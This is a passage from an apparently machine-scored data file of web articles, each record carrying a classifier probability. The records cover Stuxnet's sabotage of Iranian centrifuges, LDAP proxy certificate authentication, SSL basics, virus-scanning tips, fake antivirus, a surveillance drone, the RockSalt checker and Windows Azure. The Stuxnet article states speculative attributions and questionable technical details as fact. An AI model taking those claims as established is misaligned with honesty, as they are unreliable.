even the IAEA knew about it. --The worm also knew that the complex control system that ran the centrifuges was built by Siemens, the German manufacturer, and -- remarkably -- how that system worked as well and how to mask its activities from it. --Masking itself from the plant's security and other systems, the worm then ordered the centrifuges to rotate extremely fast, and then to slow down precipitously. This damaged the converter, the centrifuges and the bearings, and it corrupted the uranium in the tubes. It also left Iranian nuclear engineers wondering what was wrong, as computer checks showed no malfunctions in the operating system. Estimates are that this went on for more than a year, leaving the Iranian program in chaos. And as it did, the worm grew and adapted throughout the system. As new worms entered the system, they would meet and adapt and become increasingly sophisticated. During this time the worms reported back to two mysterious servers that had to be run by intelligence agencies, one in Denmark and one in Malaysia. The servers monitored the worms as they infiltrated Natanz. Efforts to find those servers since then have yielded no results. This went on until June of last year, when a Belarusan company working on the Iranian power plant in Beshehr discovered it in one of its machines. It quickly put out a notice on a Web network monitored by computer security experts around the world. Ordinarily these experts would immediately begin tracing the worm and dissecting it, looking for clues about its origin and other details. But that didn’t happen, because within minutes all the alert sites came under attack and were inoperative for 24 hours. “I had to use e-mail to send notices but I couldn’t reach everyone. Whoever made the worm had a full day to eliminate all traces of the worm that might lead us them,” Eric Byres, a computer security expert who has examined the Stuxnet. “No hacker could have done that.” Experts, including inspectors from the International Atomic Energy Agency(IAEA,) say that, despite Iran's claims to the contrary, the worm was successful in its goal: causing confusion among Iran’s nuclear engineers and disabling their nuclear program. Because of the secrecy surrounding the Iranian program, no one can be certain of the full extent of the damage. But sources inside Iran and elsewhere say that the Iranian centrifuge program has been operating far below its capacity and that the uranium enrichment program had “stagnated” during the time the worm penetrated the underground facility. Only 4,000 of the 9,000 centrifuges Iran was known to have were put into use. Some suspect that is because of the critical need to replace ones that were damaged. And the limited number of those in use dwindled to an estimated 3,700 as problems engulfed their operation. IAEA inspectors say the sabotage better explains the slowness of the program, which they had earlier attributed to poor equipment manufacturing and management problems. As Iranians struggled with the setbacks, they began searching for signs of sabotage. From inside Iran there have been unconfirmed reports that the head of the plant was fired shortly after the worm wended its way into the system and began creating technical problems, and that some scientists who were suspected of espionage disappeared or were executed. And counter intelligence agents began monitoring all communications between scientists at the site, creating a climate of fear and paranoia. Iran has adamantly stated that its nuclear program has not been hit by the bug. But in doing so it has backhandedly confirmed that its nuclear facilities were compromised. When Hamid Alipour, head of the nation’s Information Technology Company, announced in September that 30,000 Iranian computers had been hit by the worm but the nuclear facilities were safe, he added that among those hit were the personal computers of the scientists at the nuclear facilities. Experts say that Natanz and Bushehr could not have escaped the worm if it was in their engineers’ computers. “We brought it into our lab to study it and even with precautions it spread everywhere at incredible speed,” Byres said. “The worm was designed not to destroy the plants but to make them ineffective. By changing the rotation speeds, the bearings quickly wear out and the equipment has to be replaced and repaired. The speed changes also impact the quality of the uranium processed in the centrifuges creating technical problems that make the plant ineffective,” he explained. In other words the worm was designed to allow the Iranian program to continue but never succeed, and never to know why. One additional impact that can be attributed to the worm, according to David Albright of the Institute for Science and International Studies, is that “the lives of the scientists working in the facility have become a living hell because of counter-intelligence agents brought into the plant” to battle the breach. Ironically, even after its discovery, the worm has succeeded in slowing down Iran's reputed effort to build an atomic weapon. And Langer says that the efforts by the Iranians to cleanse Stuxnet from their system “will probably take another year to complete,” and during that time the plant will not be able to function anywhere normally. But as the extent of the worm’s capabilities is being understood, its genius and complexity has created another perplexing question: Who did it? Speculation on the worm’s origin initially focused on hackers or even companies trying to disrupt competitors. But as engineers tore apart the virus they learned not only the depth of the code, its complex targeting mechanism, (despite infecting more than 100,000 computers it has only done damage at Natanz,) the enormous amount of work that went into it—Microsoft estimated that it consumed 10,000 man days of labor-- and about what the worm knew, the clues narrowed the number of players that have the capabilities to create it to a handful. “This is what nation-states build, if their only other option would be to go to war,” Joseph Wouk, an Israeli security expert wrote. Byres is more certain. “It is a military weapon,” he said. And much of what the worm “knew” could only have come from a consortium of Western intelligence agencies, experts who have examined the code now believe. Originally, all eyes turned toward Israel’s intelligence agencies. Engineers examining the worm found “clues” that hinted at Israel’s involvement. In one case they found the word “Myrtus” embedded in the code and argued that it was a reference to Esther, the biblical figure who saved the ancient Jewish state from the Persians. But computer experts say \"Myrtus\" is more likely a common reference to “My RTUS,” or remote terminal units. Langer argues that no single Western intelligence agency had the skills to pull this off alone. The most likely answer, he says, is that a consortium of intelligence agencies worked together to build the cyber bomb. And he says the most likely confederates are the United States, because it has the technical skills to make the virus, Germany, because reverse-engineering Siemen’s product would have taken years without it, and Russia, because of its familiarity with both the Iranian nuclear plant and Siemen’s systems. There is one clue that was left in the code that may tell us all we need to know. Embedded in different section of the code is another common computer language reference, but this one is misspelled. Instead of saying “DEADFOOT,” a term stolen from pilots meaning a failed engine, this one reads “DEADFOO7.” Yes, OO7 has returned -- as a computer worm. Stuxnet. Shaken, not stirred.",
        "prob": "tensor([[1.4390e-04, 9.9986e-01]])"
    },
    {
        "text": "Certificate-based authentication over an SSL connection is the most secure type of authentication. Therefore, when authentication occurs at the connection layer, the client does not need to provide an additional name (bind DN) and password to Directory Proxy Server during the LDAP bind. A client can only perform certificate-based authentication over an SSL connection. The basic steps in establishing an SSL connection are as follows: The client requests that a secure connection be established. As part of this request, Directory Proxy Server provides a server certificate to the client. A server certificate is a single certificate associated with one instance of Directory Proxy Server. When a secure connection is used, the server certificate identifies the instance of Directory Proxy Server to the client. The establishment of the connection includes a negotiation phase. During this phase, the client and Directory Proxy Server attempt to agree on the encryption policy that is used. The server certificate contains the list of encryption policies (ciphers) that are supported by the Directory Proxy Server. Depending on the security configuration of the proxy server, the server might require the client to provide a certificate. The client provides a certificate to the server, either because the client is configured to do so, or because the proxy server has requested it. The client then sends an LDAP bind request to Directory Proxy Server to establish the client's identity on that connection. If the request is a simple bind, Directory Proxy Server uses the bind DN and password provided by the client. If the request is a SASL external bind, Directory Proxy Server does one of two things: Considers the subject of the certificate as the bind DN of the client. Maps the certificate by searching the backend server for an entry that matches the received certificate. If the verify-certs property is set, Directory Proxy Server verifies that the received certificate is the one stored in the entry that is found. The following configuration properties determine how Directory Proxy Server performs that search: cert-data-view-routing-policy cert-data-view-routing-custom-list cert-search-bind-dn cert-search-bind-pwd-file cert-search-base-dn cert-search-attr-mappings When the proxy server has the bind DN, it can verify the validity of the client. For more information about SSL for Directory Proxy Server, see Secure Sockets Layer for Directory Proxy Server. For certificate-based authentication to occur, Directory Proxy Server must be configured to accept client certificates and the client must be configured to use SASL external bind. When you create a Directory Proxy Server instance, the certificate database is automatically populated with the CA certificates of certain trusted CAs. You can add trusted CA certificates to the certificate database if necessary, by using the Directory Service Control Center (DSCC) or by using the dpadm command. For more information, see To Install a CA-Signed Server Certificate for Directory Proxy Server in Oracle Fusion Middleware Administration Guide for Oracle Directory Server Enterprise Edition. When a client provides a certificate to Directory Proxy Server, the server verifies that certificate against the list of trusted CA certificates in its certificate database. The verification is successful if the server's certificate database contains the client certificate itself, or the CA certificate with which the client certificate was generated. The server certificate can be one of the following: Self-signed certificate. A public and private key pair, where the public key is signed by Directory Proxy Server. Trusted CA certificate. A single certificate that is automatically generated by the company’s internal certificate server or by a known Certificate Authority (CA). Directory Proxy Server also supports the use of a server certificate chain. A server certificate chain is a collection of certificates that are automatically generated by the company’s internal certificate server or by a known CA. The certificates in a chain trace back to the original CA, providing proof of identity. This proof is required each time you obtain or install a new server certificate. When an instance of Directory Proxy Server is created, a default self-signed certificate is created. By default, Directory Proxy Server manages the SSL certificate database password internally. You can install any number of certificates on a server. When you configure SSL for an instance of Directory Proxy Server, you must install at least one server certificate and one trusted CA certificate. For an explanation of how certificate-based authentication works, see Certificate-Based Authentication. For information about how to configure certificate-based authentication for Directory Proxy Server, see To Configure Certificate-based Authentication in Oracle Fusion Middleware Administration Guide for Oracle Directory Server Enterprise Edition. When a client binds to Directory Proxy Server with the Simple Authentication and Security Layer (SASL) external bind, Directory Proxy Server obtains the credentials of the client from the certificate, rather than from the bind DN. The server obtains the credentials in one of two ways: Considers the subject of the certificate as the bind DN of the client Maps the certificate subject to data within its own database, to deduce the bind DN SASL external bind cannot be used if Directory Proxy Server is configured for BIND replay. In BIND replay, Directory Proxy Server authenticates the client to a backend LDAP server by using the client DN and password. In SASL external bind, no password is provided by the client. Furthermore, the password that is stored in the user entry cannot be read in clear text. For information about bind replay, see Directory Proxy Server Configured for BIND Replay. SSL can be used to protect subsequent interactions between the client and Directory Proxy Server. For information about how to configure authentication by SASL external bind, see To Configure Directory Proxy Server for SASL External Bind in Oracle Fusion Middleware Administration Guide for Oracle Directory Server Enterprise Edition.",
        "prob": "tensor([[2.2401e-06, 1.0000e+00]])"
    },
    {
        "text": "What is an SSL certificate? The Secure Sockets Layer (SSL) protects data transferred over http using encryption enabled by a servers SSL Certificate. An SSL Certificate is an electronic file that uniquely identifies individuals and Web sites and enables encrypted communications. An SSL Certificate contains a public key and a private key. A public key is used to encrypt information and a private key is used to decipher it. When a browser points to a secured domain, an SSL handshake authenticates the server and the client and establishes an encryption method and a unique session key. They can begin a secure session that guarantees message privacy and message integrity. SSL Certificates serve as a kind of digital Passport or credential. Typically, the \"signer\" of a certificate is a \"Certificate Authority\" (CA), such as VeriSign. Encryption, the process of transforming information to make it unintelligible to all but the intended recipient, forms the basis of data integrity and privacy necessary for e-commerce. Customers submit sensitive information and purchase goods or services via the Web only when they are confident that their personal information is secure. The solution for businesses that are serious about online transactions is to implement a trust infrastructure based on encryption technology. The diagram below illustrates the process that guarantees protected communications between a Web server and a client. All exchanges of SSL Certificates occur within seconds, and require no action by the consumer.",
        "prob": "tensor([[2.0156e-06, 1.0000e+00]])"
    },
    {
        "text": "Virus-infested files are capable of causing many different problems for computer users, making it essential to verify that downloads are safe before allowing them to access the system. There are a multitude of different tools available for computer users to help keep valuable machines protected against these malicious threats. Use one of the following methods to make certain a virus is not allowed to attack your computer system. 1. Use an Antivirus Package Many of the most popular antivirus tools allow specific files to be checked for potential corruptions. This is a valuable resource for computer users who fear a potential virus or malware infection. Simply download a file from the Internet and use the built-in antivirus scanner to check for problems. This will provide peace of mind in launching the file in question. 2. Rely on a Firewall Firewalls are additional security tools that are programmed to look for suspicious files and keep the user aware of any problems as they arise. These are particularly valuable tools when computer users are visiting sites that may try to download payloads of malware without the user’s knowledge. Firewalls are also valuable when a file is consciously downloaded, as they will look for any problems within such downloads. 3. Use an Online Scanner Instead of downloading a file that could potentially wreak havoc on the computer, some users turn to online scanners. These scanners do not require a download to the system itself, but simply ask for the URL of the file that is suspected of being infected. The server will download the file in question and peruse the content for any infections. This is an incredibly safe way of looking for viruses, and will not unnecessarily expose the machine to potential problems. 4. Find a Download Manager Sophisticated download managers have been created for users who need a way to easily look for files that may be unsafe. In addition to making downloads easier to manage, powerful download managers can scan files for potential issues, alerting the computer user of the presence of any unwanted infections before the file is launched on the machine. 5. Set Download Preferences Many computer users are surprised to discover they can control what downloads are allowed to launch on their machine. Default file settings should be modified to ensure that files and applications are only allowed to run after they have been given explicit permission by the computer user. These settings can be changed within the control panel, and will allow users to stay on the lookout for nefarious files that could otherwise launch without their knowledge of the issue. Keeping a machine running without infections is a serious responsibility that is heaped on the shoulders of any computer owner. By understanding the different protection methods available, computer users can help to ensure they remain protected whenever using the Internet to download files. It is also important to use common sense when using files from the web, making certain content only comes from trusted sources and researching applications before installing them on the machine.",
        "prob": "tensor([[2.0726e-06, 1.0000e+00]])"
    },
    {
        "text": "Fake antivirus--false pop-up warnings designed to scare money out of computer users--represents 15 percent of all malware that Google detects on Web sites, according to 13-month analysis the company conducted between January 2009 and February 2010. That's a five-fold increase from when the company first started its analysis, Niels Provos, a principal software engineer at Google, said in an interview. Meanwhile, fake antivirus scams represent half of all malware delivered via advertisements, which is becoming a problem for high-profile sites that rely on their advertisers and ad networks to distribute clean ads. Google analyzed 240 million Web pages and uncovered more than 11,000 domains involved in fake antivirus distribution for the study, which Google is set to unveil at the Usenix Workshop on Large-Scale Exploits and Emergent Threats Tuesday in San Jose, Calif. For more on this story, read Google: Fake antivirus is 15 percent of all malware on CNET News.",
        "prob": "tensor([[2.1776e-06, 1.0000e+00]])"
    },
    {
        "text": "Imagine a cheap, tiny, hovering aerial drone capable of being launched with the flick of a person’s wrist and able to provide manipulable 360-degree surveillance views. It’s real, it’s inspired by maple seeds, and the company behind it, Lockheed Martin, envisions a future in which swarms of the new drones can be deployed at a fraction of the cost and with greater capabilities than drones being used today by the military and other agencies. “Think about dropping a thousand of these out of an aircraft,” said Bill Borgia, head of Lockheed Martin’s Intelligent Robotics Lab, in a phone interview with TPM, “Think about the wide area over which one collect imagery. Instead of sending one or two expensive, highly valuable aircraft like we do today, you could send thousands of these inexpensive aircraft, and they are almost expendable.” The new drone which looks like very similar to a maple seed, with a small pod-like body attached a single whirring blade, is called the Samarai. The name is derived from the Latin word “samara,” which means a winged seed, just like the one that inspired its physical design, flight pattern and construction. In June, Lockheed Martin released a video demo of the drone’s capabilities, and it is clearly impressive, launched by hand and piloted using a tablet computer, which also displays the drone’s live surveillance feed. “You can literally pull this out of your pocket, throw it into the air, and it can start flying,” Borgia told TPM. “It can take off and land vertically indoors.” Borgia said that the drone, or unmanned aerial vehicle (UAV), was designed to be deployed in confined settings, such as urban environments or even inside buildings, where it could be piloted into different rooms and hover outside of windows, collecting surveillance footage with ease. The technology behind the drone is even more sophisticated than it looks. There are only two moving mechanical parts in the entire tiny 30-cm aircraft: The piece that makes the propeller rotate and a flap on the large wing that comprises most of the drone’s form. Then there’s the Samarai’s realtime video feed, which an operator can pan and tilt in a full 360 degrees, a capability not found on any other drone of its class, this despite the fact that the drone only contains one camera which is constantly being whipped around by the rotating motion of the aircraft itself. In order to obtain a steady video feed with the ability to virtually pan and tilt, Lockheed relies on a series of image processing algorithms, Borgia told TPM. “The algorithms sort of de-rotate the video and turn it back into a frame-by-frame view, similar to what you would see on any basic TV,” Borgia said. “All of the image processing is done onboard.” That means that even if disconnected from the cloud or a control server, the Samarai would still be able to provide its operators with constant surveillance capabilities. Borgia declined to specify the drone’s range or endurance, that is, the time it’s able to stay aloft in the air. However, he did note that the Lockheed researchers behind Samarai had experimented with battery-powered and carbon-based fuel versions (the battery powered version is the one demonstrated in the video). Borgia further said that the researchers had “developed simulation tools that allow us to scale the vehicle to meet specific applications,” asked for by customers. Lockheed Martin has not revealed any of its customers or potential partners on the Samarai yet, but Borgia said the company would make announcements “when the customers were ready.” Besides the 30-cm version shown in the June demo video, Lockheed also has field-tested a 17-cm version and is working now to scale down the Samarai even further, to the size of an actual maple seed. Asked about any potential privacy concerns presented by the Samarai, especially in light of the recent release of a voluntary industry “code of conduct” from drone manufacturers, Borgia said that “customers will have to work through the hurdles.” Lockheed Martin began work on the Samarai in 2007 under a Defense Department program called “nano air,” designed to produce “an extremely small, ultra lightweight air vehicle system.”",
        "prob": "tensor([[0.0068, 0.9932]])"
    },
    {
        "text": "July 20, 2012 A team led by Harvard computer scientists, including two undergraduate students, has developed a new tool that could lead to increased security and enhanced performance for commonly used web and mobile applications. Called RockSalt, the clever bit of code can verify that native computer programming languages comply with a particular security policy. Presented at the ACM Conference on Programming Language Design and Implementation (PLDI) in Beijing, in June, RockSalt was created by Greg Morrisett, Allen B. Cutting Professor of Computer Science at the Harvard School of Engineering and Applied Sciences (SEAS), two of his undergraduate students Edward Gan '13 and Joseph Tassarotti '13, former postdoctoral fellow Jean-Baptiste Tristan (now at Oracle), and Gang Tan of Lehigh University. The use of native code, especially in an online environment, however, opens up the door to hackers who can exploit vulnerabilities and readily gain access to other parts of a computer or device. An initial solution to this problem was offered over a decade ago by computer scientists at the University of California, Berkeley, who developed software fault isolation (SFI). SFI forces native code to \"behave\" by rewriting machine code to limit itself to functions that fall within particular parameters. This \"sandbox process\" sets up a contained environment for running native code. A separate \"checker\" program can then ensure that the executable code adheres to regulations before running the program. While considered a major breakthrough, the solution was limited to devices using RISC chips, a processor more common in research than in consumer computing. In 2006, Morrisett developed a way to implement SFI on the more popular CISC-based chips, like the Intel x86 processor. The technique was adopted widely. Google modified the routine for Google Chrome, eventually developing it into Google Native Client (or \"NaCl\"). When bugs and vulnerabilities were found in the checker for NaCl, Google sent out a call to arms. Morrissett once again took on the challenge, turning the problem into an opportunity for his students. The result was RockSalt, an improvement over NaCl, built using Coq, a proof development system. \"We built a simple but incredibly powerful system for proving a hypothesis -- so powerful that it's likely to be overlooked. We want to prove that if the checker says 'yes,' the code will indeed respect the sandbox security policy,\" says Joseph Tassarotti '13, who built and tested a model of the execution of x86 instructions. \"We wanted to get a guarantee that there are no bugs in the checker, so we set out to construct a rigorous, machine-checked proof that the checker is correct.\" \"Our proofs about the correctness of our own tool say that if you run the tool on a program, and it says it's safe to run, then according to the model, this program can only do certain things,\" Tassarotti adds. \"Our proof, however, was only as good as this model. If the model was wrong, then the tool could potentially have an error.\" In other words, he explains, think of an analogy in physics. While you might mathematically prove that according to Newton's laws, a moving object will follow a certain trajectory, the proof is only meaningful to the degree that Newton's laws accurately model the world. \"Since the x86 architecture is very complicated, it was essential to test the model by running programs on a real chip, then simulating them with the model, and seeing whether the results matched. I specified the meanings of many of these instructions and developed the testing infrastructure to check for errors in the model,\" Tassarotti says. \"The biggest benefit may be that users can have more peace of mind that a piece of software works as they want it to,\" says Morrisett. \"For users, the impact of such a tool is slightly more tangible; it allows users to safely run, for example, games, in a web browser without the painfully slow speeds that translated code traditionally provides.\" Previous efforts to develop a robust, error-free checker have resulted in some success, but RockSalt has the potential to be scaled to software widely used by the general public. The researchers expect that their tool might end up being adopted and integrated into future versions of common web browsers. Morrisett and his team also have plans to adapt the tool for use in a broader variety of processors. Reflecting on how the class project has been transformative, Tassarotti says, \"I plan to pursue a Ph.D. in computer science, and I hope to work on projects like this that can improve the correctness of software. As computers are so prevalent now in fields like avionics and medical devices, I believe that this type of research is essential to ensure safety.\" Other social bookmarking and sharing tools: Note: If no author is given, the source is cited instead.",
        "prob": "tensor([[0.0053, 0.9947]])"
    },
    {
        "text": "Introducing Windows Azure Windows Azure is Microsoft's application platform for the public cloud. You can use this platform in many different ways. For instance, you can use Windows Azure to build a web application that runs and stores its data in Microsoft datacenters. You can use Windows Azure just to store data, with the applications that use this data running on-premises (that is, outside the public cloud). You can use Windows Azure to create virtual machines for development and test or to run SharePoint and other applications. You can use Windows Azure to build massively scalable applications with lots and lots of users. Because the platform offers a wide range of services, all of these things-and more-are possible. To do any of them, though, you need to understand the basics. Even if you don't know anything about cloud computing, this article will walk you through the fundamentals of Windows Azure. The goal is to give you a foundation for understanding and using this cloud platform. Table of Contents The Components of Windows Azure To understand what Windows Azure offers, it's useful to group its services into distinct categories. Figure 1 shows one way to do this. Figure 1: Windows Azure provides Internet-accessible application services running in Microsoft datacenters. To get started with Windows Azure, you need to know at least the basics about each of its components.You can also use the What Is Windows Azure Poster for a quick, visual way to get an overview. The colors of the boxes in Figure 1 correspond to their grouping on the poster. The rest of this article walks through the technologies shown in the figure, describing what each one offers and when you might use it. One of the most basic things a cloud platform does is execute applications. Windows Azure provides three options for doing this, as Figure 2 shows. Figure 2: Windows Azure provides Infrastructure as a Service (IaaS), web hosting, and Platform as a Service (PaaS). Each of these three approaches-Virtual Machines, Web Sites, and Cloud Services-can be used separately. You can also combine them to create an application that uses two or more of these options together. The ability to create a virtual machine on demand, whether from a standard image or from one you supply, can be very useful. Add the ability to pay for this VM by the hour, and it's even more useful. This approach, commonly known as Infrastructure as a Service (IaaS), is what Windows Azure Virtual Machines provides. To create a VM, you specify which VHD to use and the VM's size. You then pay for each hour the VM is running. As Figure 2 shows, Windows Azure Virtual Machines offers a gallery of standard VHDs. These include Microsoft-provided options, such as Windows Server 2008 R2, Windows Server 2012, and Windows Server 2008 R2 with SQL Server, along with Linux images provided by Microsoft partners. You're free to upload and create VMs from your own VHDs as well. Wherever the image comes from, you can persistently store any changes made while a VM is running. The next time you create a VM from that VHD, things pick up where you left off. It's also possible to copy the changed VHD out of Windows Azure, then run it locally. Windows Azure VMs can be used in many different ways. You might use them to create an inexpensive development and test platform that you can shut down when you've finished using it. You might also create and run applications that use whatever languages and libraries you like. Those applications can use any of the data management options that Windows Azure provides, and you can also choose to use SQL Server or another DBMS running in one or more virtual machines. Another option is to use Windows Azure VMs as an extension of your on-premises datacenter, running SharePoint or other applications. To support this, it's possible to create Windows domains in the cloud by running Active Directory in Windows Azure VMs. This quite general approach to cloud computing can be used to address many different problems. What you do is up to you. One of the most common things that people do in the cloud is run web sites and web applications. Windows Azure Virtual Machines allows this, but it still leaves you with the responsibility of administering one or more VMs. What if you just want a web site where somebody else takes care of the administrative work for you? This is exactly what Windows Azure Web Sites provides. This execution model offers a managed web environment using the Windows Azure Management portal. You can move an existing web site into Windows Azure Web Sites unchanged, or you can create a new one directly in the cloud. Once a web site is running, you can add or remove instances dynamically, relying on Windows Azure Web Sites to load balance requests across them. Windows Azure Web Sites offers both a shared option, where your web site runs in a virtual machine with other sites, and a reserved option that allows a site to run in its own VM. The reserved option also lets you increase the size (computing power) of your instances if needed. Windows Azure Web Sites is intended to be useful for both developers and web design agencies. For development, it supports .NET, PHP, and Node.js, along with SQL Database and (from ClearDB, a Microsoft partner) MySQL for relational storage. It also provides built-in support for several popular applications, including WordPress, Joomla, and Drupal. The goal is to provide a low-cost, scalable, and broadly useful platform for creating web sites and web applications in the public cloud. Suppose you want to build a cloud application that can support lots of simultaneous users, doesn't require much administration, and never goes down. You might be an established software vendor, for example, that's decided to embrace Software as a Service (SaaS) by building a version of one of your applications in the cloud. Or you might be a start-up creating a consumer application that you expect will grow fast. If you're building on Windows Azure, which execution model should you use? Windows Azure Web Sites allows creating this kind of web application, but there are some constraints. You don't have administrative access, for example, which means that you can't install arbitrary software. Windows Azure Virtual Machines gives you lots of flexibility, including administrative access, and you certainly can use it to build a very scalable application, but you'll have to handle many aspects of reliability and administration yourself. What you'd like is an option that gives you the control you need but also handles most of the work required for reliability and administration. This is exactly what's provided by Windows Azure Cloud Services. This technology is designed expressly to support scalable, reliable, and low-admin applications, and it's an example of what's commonly called Platform as a Service (PaaS). To use it, you create an application using the technology you choose, such as C#, Java, PHP, Python, Node.js, or something else. Your code then executes in virtual machines (referred to as instances) running a version of Windows Server. But these VMs are distinct from the ones you create with Windows Azure Virtual Machines. For one thing, Windows Azure itself manages them, doing things like installing operating system patches and automatically rolling out new patched images. (This implies that your application shouldn't maintain state in web or worker role instances; it should instead be kept in one of the Windows Azure data management options described in the next section.) Windows Azure also monitors the VMs, restarting any that fail. As Figure 2 shows, you have two roles to choose from when you create an instance, both based on Windows Server. The main difference between the two is that an instance of a web role runs IIS, while an instance of a worker role does not. Both are managed in the same way, however, and it's common for an application to use both. For example, a web role instance might accept requests from users, then pass them to a worker role instance for processing. To scale your application up or down, you can request that Windows Azure create more instances of either role or shut down existing instances. And just like Windows Azure Virtual Machines, you're charged by the hour for each web or worker role instance. Each of the three Windows Azure execution models has its own role to play. Windows Azure Virtual Machines provides a general-purpose computing environment, Windows Azure Web Sites offers low-cost web hosting, and Windows Azure Cloud Services is the best choice for creating scalable, reliable applications with low administration costs. And as mentioned earlier, you can use these technologies separately or combine them as needed to create the right foundation for your application. The approach you choose depends on what problems you're trying to solve. Applications need data, and different kinds of applications need different kinds of data. Because of this, Windows Azure provides several different ways to store and manage data. One of these has already been mentioned: the ability to run SQL Server or another DBMS in a VM created with Windows Azure Virtual Machines. (It's important to realize that this option isn't limited to relational systems; you're also free to run NoSQL technologies such as MongoDB and Cassandra.) Running your own database system is straightforward-it replicates what we're used to in our own datacenters-but it also requires handling the administration of that DBMS. To make life easier, Windows Azure provides three data management options that are largely managed for you. Figure 3 shows the choices. Figure 3: For data management, Windows Azure provides relational storage, scalable NoSQL tables, and unstructured binary storage. Each of the three options addresses a different need: relational storage, fast access to potentially large amounts of simple typed data, and unstructured binary storage. In all three cases, data is automatically replicated across three different computers in a Windows Azure datacenter to provide high availability. It's also worth pointing out that all three options can be accessed either by Windows Azure applications or by applications running elsewhere, such as your on-premises datacenter, your laptop, or your phone. And however you apply them, you pay for all Windows Azure data management services based on usage, including a gigabyte-per-month charge for stored data. For relational storage, Windows Azure provides SQL Database. Formerly called SQL Azure, SQL Database provides all of the key features of a relational database management system, including atomic transactions, concurrent data access by multiple users with data integrity, ANSI SQL queries, and a familiar programming model. Like SQL Server, SQL Database can be accessed using Entity Framework, ADO.NET, JDBC, and other familiar data access technologies. It also supports most of the T-SQL language, along with SQL Server tools such as SQL Server Management Studio. For anybody familiar with SQL Server (or another relational database), using SQL Database is straightforward. But SQL Database isn't just a DBMS in the cloud-it's a PaaS service. You still control your data and who can access it, but SQL Database takes care of the administrative grunt work, such as managing the hardware infrastructure and automatically keeping the database and operating system software up to date. SQL Database also provides a federation option that distributes data across multiple servers. This is useful for applications that work with large amounts of data or need to spread data access requests across multiple servers for better performance. If you're creating a Windows Azure application (using any of the three execution models) that needs relational storage, SQL Database can be a good option. Applications running outside the cloud can also use this service, though, so there are plenty of other scenarios. For instance, data stored in SQL Database can be accessed from different client systems, including desktops, laptops, tablets, and phones. And because it provides built-in high availability through replication, using SQL Database can help minimize downtime. Suppose you want to create a Windows Azure application that needs fast access to typed data, maybe lots of it, but doesn't need to perform complex SQL queries on this data. For example, imagine you're creating a consumer application that needs to store customer profile information for each user. Your app is going to be very popular, so you need to allow for lots of data, but you won't do much with this data beyond storing it, then retrieving it in simple ways. This is exactly the kind of scenario where Windows Azure Tables makes sense. Don't be confused by the name: this technology doesn't provide relational storage. (In fact, it's an example of a NoSQL approach called a key/value store.) Instead, Windows Azure Tables let an application store properties of various types, such as strings, integers, and dates. An application can then retrieve a group of properties by providing a unique key for that group. While complex operations like joins aren't supported, tables offer fast access to typed data. They're also very scalable, with a single table able to hold as much as a terabyte of data. And matching their simplicity, tables are usually less expensive to use than SQL Database's relational storage. The third option for data management, Windows Azure Blobs, is designed to store unstructured binary data. Like Tables, Blobs provides inexpensive storage, and a single blob can be as large as one terabyte. An application that stores video, for example, or backup data or other binary information can use blobs for simple, cheap storage. Windows Azure applications can also use Windows Azure drives, which let blobs provide persistent storage for a Windows file system mounted in a Windows Azure instance. The application sees ordinary Windows files, but the contents are actually stored in a blob. Windows Azure runs today in several datacenters spread across the United States, Europe, and Asia. When you run an application or store data, you can select one or more of these datacenters to use. You can also connect to these datacenters in various ways: You can use Windows Azure Virtual Network to connect your own on-premises local network to a defined set of Windows Azure VMs. If your Windows Azure application is running in multiple datacenters, you can use Windows Azure Traffic Manager to route requests from users intelligently across instances of the application. Figure 4 illustrates these options. Figure 4: Windows Azure allows creating a cloud VPN, and intelligently distributing user requests across different datacenters. One useful way to use a public cloud is to treat it as an extension of your own datacenter. Because you can create VMs on demand, then remove them (and stop paying) when they're no longer needed, you can have computing power only when you want it. And since Windows Azure Virtual Machines lets you can create VMs running SharePoint, Active Directory, and other familiar on-premises software, this approach can work with the applications you already have. To make this really useful, though, your users ought to be able to treat these applications as if they were running in your own datacenter. This is exactly what Windows Azure Virtual Network allows. Using a VPN gateway device, an administrator can set up a virtual private network (VPN) between your local network and a defined group of VMs running in Windows Azure. Because you assign your own IP v4 addresses to the cloud VMs, they appear to be on your own network. Users in your organization can access the applications those VMs contain as if they were running locally. A Windows Azure application with users in just a single part of the world might run in only one Windows Azure datacenter. An application with users scattered around the world, however, is more likely to run in multiple datacenters, maybe even all of them. In this second situation, you face a problem: How do you intelligently assign users to application instances? Most of the time, you probably want each user to access the datacenter closest to her, since it will likely give her the best response time. But what if that copy of the application is overloaded or unavailable? In this case, it would be nice to route her request automatically to another datacenter. This is exactly what's done by Windows Azure Traffic Manager. The owner of an application defines rules that specify how requests from users should be routed to datacenters, then relies on Traffic Manager to carry out these rules. For example, users might normally be routed to the closest Windows Azure datacenter, but get sent to another one when the response time from their default datacenter exceeds a certain threshold. For globally distributed applications with many users, having a built-in service to handle problems like these is useful. Analyzing data is a fundamental part of how businesses use information technology. A cloud platform provides a pool of on-demand, pay-per-use resources, which makes it a good foundation for this kind of computing. Accordingly, Windows Azure provides two options for business analytics. Figure 5 illustrates the choices. Figure 5: For business analytics, Windows Azure provides reporting and support for big data. Analyzing data can take many forms, and so these two options are quite different. It's worth looking at each one separately. One of the most common ways to use stored data is to create reports based on that data. To let you do this with data in SQL Database, Windows Azure provides SQL Reporting. A subset of the reporting services included with SQL Server, SQL Reporting lets you build reporting into applications running on Windows Azure or on premises. The reports you create can be in various formats, including HTML, XML, PDF, Excel, and others, and they can be embedded in applications or viewed via a web browser. Another option for doing analytics with SQL Database data is to use on-premises business intelligence tools. To a client, SQL Database looks like SQL Server, and so the same technologies can work with both. For example, you're free to use on-premises SQL Server Reporting Services to create reports from SQL Database data. For many years, the bulk of data analysis has been done on relational data stored in a data warehouse built with a relational DBMS. This kind of business analytics is still important, and it will be for a long time to come. But what if the data you want to analyze is so big that relational databases just can't handle it? And suppose the data isn't relational? It might be server logs in a datacenter, for example, or historical event data from sensors, or something else. In cases like this, you have what's known as a big data problem. You need another approach. The dominant technology today for analyzing big data is Hadoop. An Apache open source project, this technology stores data using the Hadoop Distributed File System (HDFS), then lets developers create MapReduce jobs to analyze that data. HDFS spreads data across multiple servers, then runs chunks of the MapReduce job on each one, letting the big data be processed in parallel. HDInsight is the name of the Windows Azure's Apache Hadoop-based service. As Figure 5 suggests, HDInsight lets HDFS store data on the cluster and distribute it across multiple VMs. It also spreads the logic of a MapReduce job across those VMs. Just as with on-premises Hadoop, data is processed locally-the logic and the data it works on are in the same VM-and in parallel for better performance. HDInsight can also store data in Windows Azure Storage Vault (ASV), which uses blobs. Using ASV allows you to save money because you can delete your HDInsight cluster when not in use, but still keep your data in the cloud. HDinsight supports other components of the Hadoop ecosystem as well, including Hive and Pig. Microsoft has also created components that make it easier to work with data produced by HDInsight using traditional BI tools, such as the HiveODBC adapter and Data Explorer that work with Excel. No matter what it's 